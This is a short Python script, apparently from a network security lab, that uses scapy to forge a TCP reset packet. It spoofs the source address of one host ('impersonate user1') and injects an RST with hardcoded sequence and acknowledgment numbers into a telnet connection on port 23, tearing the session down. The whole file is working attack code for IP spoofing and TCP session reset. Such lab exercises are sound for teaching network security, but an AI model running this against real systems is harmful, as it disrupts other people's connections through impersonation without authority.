#!/usr/bin/env python3

from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5") # impersonate user1
tcp = TCP(sport=41420, dport=23, flags="R", seq=4207515053, ack=3028687870) #sequence number, destination port, acknowledgment number
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)